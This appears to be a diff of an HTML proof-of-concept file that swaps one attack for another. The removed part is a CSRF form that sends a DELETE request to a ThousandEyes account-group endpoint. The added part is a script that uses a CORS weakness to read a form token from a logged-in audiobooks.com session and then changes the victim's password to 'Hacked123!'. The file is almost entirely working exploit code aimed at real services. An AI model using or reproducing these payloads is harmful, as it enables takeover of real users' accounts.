@@ -1,7 +1,29 @@
+<!DOCTYPE html>
 <html>
-	<body>
-		<form method="DELETE" action="https://app.thousandeyes.com/ajax/settings/account/account-group/562949953615522">
-			<input type="submit" value="Submit">
-		</form>
-	</body>
-<html>
+<body>
+<script>
+// Step 1: Read token via open CORS
+fetch('https://www.audiobooks.com/account', {
+  credentials: 'include'
+})
+.then(r => r.text())
+.then(html => {
+  // Extract token
+  let token = html.match(/formy_form_token['":\s,]+([a-f0-9]{32})/)[1];
+  console.log('Token:', token);
+
+  // Step 2: Use token to change password (works on OAuth accounts)
+  return fetch('https://www.audiobooks.com/account/update/password', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: `existingPassword=&password=Hacked123!&formy_form_token=${token}`
+  });
+})
+.then(r => r.json())
+.then(result => console.log('Result:', result));
+</script>
+</body>
+</html>
